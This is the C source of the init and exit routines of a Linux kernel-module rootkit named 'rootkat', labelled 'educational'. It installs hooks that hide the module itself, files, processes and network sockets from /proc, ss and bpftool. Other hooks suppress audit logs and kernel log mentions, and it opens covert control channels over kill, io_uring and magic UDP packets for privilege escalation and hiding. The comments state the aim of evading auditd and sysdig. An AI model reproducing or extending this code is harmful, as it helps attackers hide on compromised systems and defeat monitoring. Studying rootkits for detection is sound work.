// SPDX-License-Identifier: MIT
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include "kallsyms.h"
#include "resolver.h"
#include "hook_m_show.h"
#include "hook_sys_kill.h"
#include "hook_filldir64.h"
#include "hook_tcp4_seq_show.h"
#include "hook_tcp6_seq_show.h"
#include "hook_udp_seq_show.h"
#include "hook_inet_sk_diag_fill.h"
#include "hook_sys_bpf.h"
#include "hook_audit.h"
#include "hook_unix_seq_show.h"
#include "hook_unix_diag.h"
#include "hook_io_issue_sqe.h"
#include "hook_netfilter.h"
#include "hook_printk.h"
#include "hidden_unix_paths.h"

#define ROOTKAT_TAG "rootkat: "

/*
 * Cross-module Rust integration: rootkat_rust_canary.ko (built only on
 * matrix entries with KERNEL_RUST=enabled) exports rootkat_canary_tick.
 * Use symbol_get() instead of __weak extern so the C module does not
 * require GOT relocations (R_AARCH64_LD64_GOT_LO12_NC = 312) which are
 * unsupported by some arm64 kernel builds.
 */
typedef u32 (*rootkat_canary_fn_t)(void);

static int __init rootkat_init(void)
{
	int rc;

	pr_debug(ROOTKAT_TAG "loading\n");

	{
		rootkat_canary_fn_t fn =
			(rootkat_canary_fn_t)__symbol_get("rootkat_canary_tick");
		if (fn) {
			u32 ticks = fn();

			pr_debug(ROOTKAT_TAG "rust canary present, tick=%u\n",
				 ticks);
			__symbol_put("rootkat_canary_tick");
		} else {
			pr_debug(ROOTKAT_TAG "rust canary not loaded (C-only build)\n");
		}
	}

	rootkat_hidden_unix_paths_init();

	rc = rootkat_kallsyms_init();
	if (rc) {
		pr_err(ROOTKAT_TAG "kallsyms init failed: %d\n", rc);
		return rc;
	}

	/* Install the printk filter as early as possible — kernel-side
	 * mentions of "rootkat" in the ring buffer get dropped from this
	 * point onward (including the kernel's "<mod>: loading out-of-tree
	 * module taints kernel" warning, except when that printed BEFORE
	 * rootkat_init runs at all — which is most of the time, so the
	 * OOT-taint warning is structurally unfilterable). Our own log
	 * lines are pr_debug, silenced by dynamic_debug. Re-enable for
	 * dev:  echo 'module rootkat +p' > /sys/kernel/debug/dynamic_debug/control */
	rc = rootkat_hook_printk_install();
	if (rc)
		pr_debug(ROOTKAT_TAG "printk hook failed: %d\n", rc);

	rc = rootkat_hook_m_show_install();
	if (rc) {
		pr_err(ROOTKAT_TAG "self-hide hook failed: %d\n", rc);
		return rc;
	}

	rc = rootkat_hook_sys_kill_install();
	if (rc) {
		pr_err(ROOTKAT_TAG "sys_kill hook failed: %d\n", rc);
		rootkat_hook_m_show_remove();
		return rc;
	}

	rc = rootkat_hook_filldir64_install();
	if (rc) {
		pr_err(ROOTKAT_TAG "filldir64 hook failed: %d\n", rc);
		rootkat_hook_sys_kill_remove();
		rootkat_hook_m_show_remove();
		return rc;
	}

	rc = rootkat_hook_tcp4_seq_show_install();
	if (rc) {
		pr_err(ROOTKAT_TAG "tcp4_seq_show hook failed: %d\n", rc);
		rootkat_hook_filldir64_remove();
		rootkat_hook_sys_kill_remove();
		rootkat_hook_m_show_remove();
		return rc;
	}

	rc = rootkat_hook_tcp6_seq_show_install();
	if (rc) {
		pr_err(ROOTKAT_TAG "tcp6_seq_show hook failed: %d\n", rc);
		rootkat_hook_tcp4_seq_show_remove();
		rootkat_hook_filldir64_remove();
		rootkat_hook_sys_kill_remove();
		rootkat_hook_m_show_remove();
		return rc;
	}

	/* UDP port hiding — non-fatal, mirrors TCP. */
	rc = rootkat_hook_udp4_seq_show_install();
	if (rc)
		pr_debug(ROOTKAT_TAG "udp4_seq_show hook failed: %d\n", rc);
	rc = rootkat_hook_udp6_seq_show_install();
	if (rc)
		pr_debug(ROOTKAT_TAG "udp6_seq_show hook failed: %d\n", rc);

	/* Non-fatal: this hook depends on a symbol that may be inlined or
	 * renamed on some kernels. If it doesn't resolve, the ss(8) bypass
	 * stays open, but every other hook still works. Log + continue. */
	rc = rootkat_hook_inet_sk_diag_fill_install();
	if (rc)
		pr_debug(ROOTKAT_TAG "inet_sk_diag_fill hook failed: %d (ss bypass not closed)\n",
		        rc);

	/* Non-fatal: BPF prog self-hide. */
	rc = rootkat_hook_sys_bpf_install();
	if (rc)
		pr_debug(ROOTKAT_TAG "sys_bpf hook failed: %d (bpftool prog list will see us)\n",
		        rc);

	/* Non-fatal: audit log suppression for hidden PIDs. */
	rc = rootkat_hook_audit_log_start_install();
	if (rc)
		pr_debug(ROOTKAT_TAG "audit_log_start hook failed: %d\n", rc);

	/* Non-fatal: AF_UNIX path hide via /proc/net/unix. */
	rc = rootkat_hook_unix_seq_show_install();
	if (rc)
		pr_debug(ROOTKAT_TAG "unix_seq_show hook failed: %d (proc unix path not hidden)\n",
		        rc);

	/* Non-fatal: AF_UNIX path hide via NETLINK_SOCK_DIAG (`ss -lx`).
	 * Closes the v0.7 gap. Resolved via module-scoped lookup because
	 * sk_diag_fill is a static name colliding across diag modules. */
	rc = rootkat_hook_unix_diag_install();
	if (rc)
		pr_debug(ROOTKAT_TAG "unix_diag hook failed: %d (ss -lx not closed)\n",
		        rc);

	/* Non-fatal: io_uring covert-channel control surface. Lets a
	 * userspace process trigger privesc / hide-pid / hide-port via
	 * an IORING_OP_NOP SQE with a magic user_data, bypassing the
	 * kill-syscall path that auditd/sysdig typically watch. */
	rc = rootkat_hook_io_issue_sqe_install();
	if (rc)
		pr_debug(ROOTKAT_TAG "io_issue_sqe hook failed: %d (io_uring covert channel down)\n",
		        rc);

	/* Non-fatal: netfilter PRE_ROUTING hook. Inbound UDP packets with
	 * a magic 16-byte payload prefix trigger hide-pid/hide-port without
	 * needing a listening socket on this host — the rootkit hears the
	 * command at the network layer and silently drops the packet. */
	rc = rootkat_hook_netfilter_install();
	if (rc)
		pr_debug(ROOTKAT_TAG "netfilter hook failed: %d (network covert channel down)\n",
		        rc);

	pr_debug(ROOTKAT_TAG "loaded (hidden)\n");
	return 0;
}

static void __exit rootkat_exit(void)
{
	/* Keep the printk filter live until last so any post-unload
	 * kernel "rootkat" mentions still get dropped while our other
	 * hooks tear down. */
	rootkat_hook_netfilter_remove();
	rootkat_hook_io_issue_sqe_remove();
	rootkat_hook_unix_diag_remove();
	rootkat_hook_unix_seq_show_remove();
	rootkat_hook_audit_log_start_remove();
	rootkat_hook_sys_bpf_remove();
	rootkat_hook_inet_sk_diag_fill_remove();
	rootkat_hook_udp6_seq_show_remove();
	rootkat_hook_udp4_seq_show_remove();
	rootkat_hook_tcp6_seq_show_remove();
	rootkat_hook_tcp4_seq_show_remove();
	rootkat_hook_filldir64_remove();
	rootkat_hook_sys_kill_remove();
	rootkat_hook_m_show_remove();
	rootkat_hook_printk_remove();
	pr_debug(ROOTKAT_TAG "unloaded\n");
}

module_init(rootkat_init);
module_exit(rootkat_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("rootkat");
MODULE_DESCRIPTION("Educational LKM rootkit skeleton");
MODULE_VERSION("0.0.1");
